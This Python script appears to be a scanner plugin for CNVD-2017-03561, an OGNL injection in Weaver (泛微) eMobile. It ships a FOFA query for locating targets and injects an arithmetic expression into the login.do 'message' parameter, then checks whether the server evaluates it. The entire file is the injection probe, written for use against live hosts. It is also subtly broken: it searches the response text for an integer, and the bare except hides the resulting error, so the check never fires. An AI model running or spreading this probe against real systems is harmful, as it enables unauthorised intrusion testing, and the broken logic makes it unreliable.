#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '泛微 OGNL Injection CNVD-2017-03561',

      'level'     :   'high',

      'FOFA'      :   'app="泛微-eMobile"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/3/4',
  }
  return ret
def randomInt(n,m):#返回某个范围中的int
  import random
  return random.randint(n,m)
def run(url,ua):
  r0 = randomInt(7000,8000)
  r1 = randomInt(7000,8000)
  r2 = r0 * r1
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  targets = [
      f'/login.do?message={r0}*{r1}',
      f'/login/login.do?message={r0}*{r1}',
  ]
  url1 = url + targets[0]
  url2 = url + targets[1]
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and r2 in res.text:
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass
  try:
    res=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and r2 in res.text:
      ret['url'] = url2
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass
  return ret